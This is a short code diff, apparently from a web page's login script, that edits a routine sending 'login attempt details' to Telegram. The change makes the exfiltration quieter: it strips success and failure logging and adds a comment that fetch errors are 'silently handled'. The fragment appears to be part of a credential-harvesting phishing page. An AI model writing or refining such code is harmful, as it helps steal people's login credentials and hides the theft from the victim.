@@ -446,16 +446,12 @@
                         })
                     });
 
-                    // No console.log or alert for success/failure
-                    // const result = await response.json();
-                    // if (result.ok) {
-                    //     console.log('Login attempt details sent to Telegram successfully!');
-                    // } else {
-                    //     console.error('Error sending login attempt to Telegram:', result.description);
-                    // }
+                    // Ensure the response body is consumed, even if we don't explicitly use the result
+                    await response.json();
+
                 } catch (error) {
                     // No console.error for fetch errors
-                    // console.error('Error sending login attempt message:', error);
+                    // Errors during fetch or response parsing will be silently handled
                 }
             }
         });
